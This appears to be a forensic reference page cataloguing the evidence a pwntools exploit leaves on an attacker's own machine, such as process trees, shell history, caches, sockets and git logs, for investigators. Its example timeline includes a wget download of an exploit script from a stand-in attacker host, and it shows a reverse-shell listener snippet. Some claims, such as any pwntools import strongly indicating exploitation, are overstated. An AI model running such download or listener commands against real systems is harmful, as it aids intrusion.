# pwntools — Source Evidence

Source evidence is what a pwntools-based exploit leaves on the **attacker's own host** during development and execution. Because pwntools is a library (not a standalone CLI), evidence revolves around **Python process execution**, **script files**, **network activity**, and **subprocess spawning**.

---

## 1. Python Process Execution

### Parent Process

When an operator runs a pwntools exploit script, the evidence chain starts with the Python interpreter:

```
PID 1234: python3 /path/to/exploit.py
  └─ Parent: bash (or sh, zsh, systemd-run, etc.)
  └─ Command line: python3 /path/to/exploit.py [args]
  └─ Working directory: /home/attacker/exploits/
  └─ Execution timeline: 2026-08-11 14:23:45 UTC
```

**Artifacts:**

| Artifact | Location | Contents |
|----------|----------|----------|
| **Process execution** | Sysmon Event 1 (Windows), `ausearch` (Linux) | Python process, full CLI, working directory, parent process tree. |
| **Bash history** | `~/.bash_history`, `~/.zsh_history` | Exact command invoked, e.g., `python3 /root/pwn_exploit.py`. |
| **Shell environment** | Process memory, core dumps | Environment variables (PATH, HOME, PYTHONPATH). |
| **Python bytecode cache** | `__pycache__/`, `.pyc` files | Compiled Python modules; mtime ties to exploit execution. |

---

## 2. Script Files and Source Code

### Exploit Script Itself

The Python script embedding pwntools is the **primary source artifact**. On disk:

```
/home/attacker/exploits/target_exploit.py
├─ Readable as plaintext (Python is interpreted)
├─ Contains hard-coded exploit parameters:
│  ├─ Target IP/port: remote("10.0.0.5", 9000)
│  ├─ Binary paths: ELF("./target")
│  ├─ Function addresses (if not using ASLR bypass)
│  ├─ Gadget addresses (ROP chains)
│  ├─ Payload content (shellcode snippets)
│  └─ Credentials (SSH passwords in ssh() calls)
└─ File properties:
   ├─ Size: varies (typically 1-10 KB for a focused exploit)
   ├─ Creation date: mtime of script file
   └─ Ownership: attacker's uid
```

**Value for analysis:**
- Readable source reveals exact attack technique, target details, and operator skill level.
- Cross-reference IP addresses, binary names, and function offsets against known targets.
- Credentials embedded in scripts are directly recoverable.

### Secondary Script Files

Related files on attacker's filesystem:

| File | Purpose | Evidence |
|------|---------|----------|
| `requirements.txt` | Dependency list | Documents pwntools version used. |
| `setup_env.sh` | Environment setup | Reveals tool installation paths, PYTHONPATH customization. |
| `.gdbinit` | GDB initialization | Breakpoint configuration, debugging strategy. |
| `target_config.json` | Exploit parameters (if externalized) | Hard-coded addresses, target details. |
| `payload_template.bin` | Shellcode/ROP chain template | Pre-calculated payloads, indicating prior reconnaissance. |

---

## 3. Python Module Imports and Dependencies

### Pwntools Library Location

The pwntools library itself resides in Python's site-packages:

```
/usr/local/lib/python3.11/site-packages/pwntools-4.13.0-py3.11.egg/
├─ pwnlib/
│  ├─ tubes/
│  ├─ rop/
│  ├─ shellcraft/
│  ├─ elf/
│  ├─ asm.py
│  ├─ gdb.py
│  └─ ...
└─ pwntools-4.13.0.dist-info/
   └─ METADATA (version, author, dependencies)
```

**Detection Signal:** Any execution of Python scripts importing `from pwn import *` or `from pwnlib import tubes, rop, shellcraft, elf` is a strong indicator of exploitation activity.

---

## 4. Network Connections Initiated by Script

### Outbound Connections

A pwntools exploit makes network connections from the operator's host to the target(s):

#### TCP/Remote Connections

```python
p = remote("10.0.0.5", 9000)  # Connects to target:9000
p.sendline(payload)
p.recv(1024)
```

**Evidence on attacker's host:**
| Tool | Event | Details |
|------|-------|---------|
| **netstat/ss** | Established connection | `ESTABLISHED` state, local port (ephemeral high port, e.g., 54321), remote 10.0.0.5:9000. |
| **tcpdump / Wireshark** | Packet capture | TCP SYN/ACK, data sent (exploit payload), data received (response). |
| **lsof** | Open file descriptor | `python3 1234 user 42u IPv4 12345678 ... 10.0.0.5:9000 (ESTABLISHED)`. |
| **Sysmon Event 3 (Windows)** | Network connection | Source IP, source port, destination IP 10.0.0.5, destination port 9000, protocol TCP. |

#### SSH Connections

```python
s = ssh(host="10.0.0.20", user="admin", password="secret")
p = s.process("./target")
```

**Evidence:**
| Source | Event | Details |
|--------|-------|---------|
| **~/.ssh/known_hosts** | SSH host key | Entry for 10.0.0.20 (or ~/.ssh/config if pre-configured). |
| **SSH client logs** | auth.log (target side) / .bash_history | Successful login, process spawning. |
| **~/.ssh/history** (if enabled) | SSH session log | Commands executed remotely, including `./target`. |

#### Listening Sockets (Reverse Shell)

```python
p = listen(4444)  # Listen for incoming connection
p.wait_for_connection()
```

**Evidence:**
| Source | Event | Details |
|--------|-------|---------|
| **netstat / ss** | Listening socket | `LISTEN` state, local port 4444, `*:*` (any interface). |
| **lsof** | Open socket | `python3 1234 user 43u IPv4 98765432 ... *:4444 (LISTEN)`. |
| **Firewall logs** | Inbound rule match | If firewall auditing is enabled, incoming connection attempt on 4444. |

---

## 5. Subprocess Spawning

### Local Process Execution

When a pwntools script uses `process()`:

```python
p = process("./target")  # Forks a child process
p.sendline(payload)
```

**Process tree evidence:**

```
PID 1234: python3 exploit.py
  └─ PID 5678: ./target
     └─ Stdin: pipe from python3
     └─ Stdout: pipe to python3
     └─ Stderr: pipe to python3
```

**Artifacts:**

| Source | Event | Details |
|--------|-------|---------|
| **Sysmon Event 1 (Windows)** | Process creation | Child PID 5678, ParentImage python3, TargetObject ./target (or full path). |
| **auditd (Linux)** | EXECVE audit | syscall=EXECVE, exe="./target", parent ppid=1234. |
| **/proc/PID/cmdline** | Process command-line | Content: `./target\0` (null-terminated). |
| **strace/ltrace** | System calls | openat, mmap, clone/fork, execve logged if tracing python3. |

### Remote Process Spawning (SSH)

```python
s = ssh(...)
p = s.process("./target")
```

**Evidence on target host:**
- Process spawning from SSH session (parent: sshd or shell).
- Target binary execution log.

**Evidence on attacker host:**
- SSH connection state, subprocess I/O redirection.

---

## 6. GDB Debugger Integration

When script uses `gdb.attach()` or `gdb.debug()`:

```python
gdb.attach(p)  # Opens terminal with GDB attached
gdb.debug("./target", "break main\ncontinue")
```

**Artifacts:**

| Source | Event | Details |
|--------|-------|---------|
| **Sysmon Event 1** | GDB process | Process: gdb (or gdb-<version>), Parent: python3, CommandLine: `gdb -p PID` or `gdb ./target`. |
| **GDB session files** | ~/.gdb_history | Commands executed in GDB (breakpoints, memory inspection). |
| **XTerm/Terminal logs** | Terminal emulator | GDB window spawned, commands typed, output displayed. |
| **Temporary files** | /tmp/gdb_* | GDB creates pipes and temporary files for I/O redirection. |

---

## 7. Temporary Files and Cache

### pwntools Cache

The library caches binary analysis results:

```
~/.cache/pwntools/
├─ gadgets/
│  ├─ <binary-hash>.cache  # ROP gadget cache for analyzed binary
│  └─ <binary-hash>.lock   # Lock file during analysis
└─ asm/
   └─ <asm-hash>.asm       # Cached assembled shellcode
```

**Evidence:**
- Cache files have mtime = script execution time.
- Filenames contain binary hash (indicates which binary was analyzed).
- Presence of gadget cache strongly suggests ROP exploit development.

### Temporary Working Directory

```
/tmp/
├─ pwntools_XXXXXX/        # Temporary directory created by pwntools
│  ├─ shellcode.bin        # Generated shellcode
│  ├─ core.dump            # Core dump if gdb.corefile() called
│  └─ gdb_script_XXXXXX    # GDB commands script
└─ /dev/shm/
   └─ pwntools_XXXXXX/     # In-memory temp (faster, disappears on reboot)
```

**Artifacts:**
| Source | Contents | Timeline |
|--------|----------|----------|
| **Filesystem** | /tmp files | Creation time = script execution time. |
| **File content** | Shellcode, core dumps, GDB scripts | Reveals payload details and debugging scope. |
| **Cleanup** | Files may persist if script crashes | Incomplete cleanup indicates crash/error. |

---

## 8. Binary Files and Analysis Artifacts

### Downloaded/Analyzed Binaries

Operators typically save the target binary locally for analysis:

```
~/exploits/
├─ target_binary         # Local copy of remote target (for offline analysis)
├─ libc.so.6             # System libc (for symbol resolution)
├─ target_binary.bak     # Backup before patching (if modifying binary)
└─ target_binary_gdb.log # GDB output from previous session
```

**Evidence:**
- Local binary copy is disk evidence of prior reconnaissance.
- Comparison of local vs. remote versions reveals modifications.
- File timestamps indicate analysis timeframe.

### Generated/Patched Binaries

If script uses `elf.save()` to write a modified binary:

```python
elf = ELF("./target")
elf.address = 0x400000  # Patch load address
elf.save("./target_patched")
```

**Artifacts:**
- New file on disk: `target_patched`.
- Size may differ (patched sections).
- Content differs (modified instructions, addresses, imports).

---

## 9. Shell Command History

### Bash/Zsh History

Commands to run pwntools exploits appear in shell history:

```bash
$ cat ~/.bash_history
...
python3 exploit.py
python3 -c "from pwn import *; p = remote('10.0.0.5', 9000); ..."
python3 -m pdb exploit.py
gdb -x exploit_gdb.script
...
```

**Analysis value:**
- Exact command invoked (helps identify script name, arguments).
- Timestamps (if history is configured with timestamps).
- Sequence of commands (reconnaissance, exploit, post-exploitation).

---

## 10. Credential and Authentication Evidence

### Hard-Coded Credentials in Scripts

```python
s = ssh(host="10.0.0.20", user="admin", password="SecretPass123")
p = s.process("./vuln")
```

**Evidence:**
- Password appears in script source code (plaintext).
- SSH keys or passphrases in environment or config files.
- API keys for cloud targets (if pwntools used for cloud exploitation).

### SSH Key Material

```
~/.ssh/
├─ id_rsa          # SSH private key (if used for exploitation)
├─ id_rsa.pub
├─ known_hosts     # SSH host keys (confirms target hosts contacted)
└─ config          # SSH configuration (Host entries = targets)
```

---

## 11. Python Core Dumps and Memory Evidence

### Core Dump from Python Process

If Python process crashes:

```
/var/crash/
└─ python3.3.1234.crash  # Core dump from python3 PID 1234
```

**Contents:**
- Exploit script in process memory.
- Shellcode payload (if not yet sent).
- Target addresses (leaked via information disclosure).
- Credentials (SSH passwords, tokens).

### Memory Forensics

If attacker's machine is compromised or seized:

```
~/.viminfo           # Vim history; if attacker edited exploit in vim
~/.less_history      # Less history; if attacker viewed source files
/proc/self/maps      # Memory map of running exploit (during execution)
/proc/self/environ   # Environment variables (PYTHONPATH, home, etc.)
```

---

## 12. Build and Version Control Evidence

### Git Repository Evidence

If exploit is version-controlled:

```
~/exploits/.git/
├─ refs/heads/main
├─ objects/              # Commit objects (every version of exploit)
├─ logs/HEAD             # Commit log (timestamps, messages)
└─ config                # Remote URLs (may reveal infrastructure)
```

**Artifacts:**
- Full history of exploit development (git log).
- Commits named "target_exploit", "ROP_chain_v2", "added_libc_leak", etc.
- Author metadata (git config user.name, user.email).

### Python Package Installation Log

```
~/.pip/pip.log           # pip installation history
/var/log/apt/history.log # apt-get install pwntools log (Debian)
```

**Contents:**
- pwntools version installed.
- Installation date/time.
- Dependency versions (capstone, keystone, etc.).

---

## 13. Reconnaissance Artifacts

### Target Binary Downloads

```
~/downloads/
└─ target_from_10.0.0.5_backup.bin  # Downloaded target binary
```

**Artifacts:**
- File download timestamp (wget/curl logs in shell history).
- Size comparison with remote (may indicate partial or corrupted transfer).

### Network Reconnaissance Output

```
~/.cache/nmap/
├─ 10.0.0.5_scan.xml    # nmap scan results
└─ 10.0.0.0_24_svc.txt  # Service enumeration

~/recon/
├─ target_strings.txt    # strings ./target output
└─ target_objdump.txt    # objdump -d ./target output
```

**Timeline Evidence:**
- Timestamps show reconnaissance phase before actual exploitation.
- Tool versions (nmap -V) in output files.

---

## Timeline Correlation

### Exploitation Timeline

```
2026-08-11 14:00:00  mkdir ~/exploits
2026-08-11 14:05:00  wget http://attacker_site/exploit.py
2026-08-11 14:10:00  wget http://target/target_binary
2026-08-11 14:20:00  python3 exploit.py
                      ├─ Network connection to 10.0.0.5:9000
                      ├─ TCP SYN/ACK observed on target
                      ├─ Subprocess spawned: ./target
                      └─ gdb.attach() triggered (terminal opened)
2026-08-11 14:25:00  p.interactive() — shell access achieved
2026-08-11 14:30:00  p.close() — exploit session closed
2026-08-11 14:35:00  rm -rf ~/exploits (attacker cleanup)
```

**Investigative Leverage:**
- File timestamps correlate exploit development with network events on target.
- Process timelines tie Python process to subprocess spawning.
- Network packet timestamps match shell command history.

---

## Summary: Source Evidence Priority

### High-Priority Artifacts (EUID recovery, direct investigation)

1. **Python script source code** — Read directly for target, technique, and parameters.
2. **Shell history** (.bash_history) — Timeline and exact invocation.
3. **Network connections** (netstat, tcpdump) — Target IP/port, timing, data flow.
4. **Subprocess spawning** (Sysmon, auditd) — Linked to target binary execution.
5. **Git history** (.git/logs) — Full development timeline and authorship.

### Medium-Priority Artifacts (correlation and context)

6. **GDB history** (.gdb_history, gdb session files) — Debugging technique and target inspection.
7. **Cache files** (~/.cache/pwntools/) — ROP gadget analysis, binary paths.
8. **Temporary files** (/tmp/pwntools_*) — Payload content, core dumps, GDB scripts.

### Low-Priority Artifacts (confirmation only)

9. **Environment variables** (PYTHONPATH, HOME) — Configuration and tool setup.
10. **Package logs** (pip.log, apt history) — pwntools version (often default versions are used).

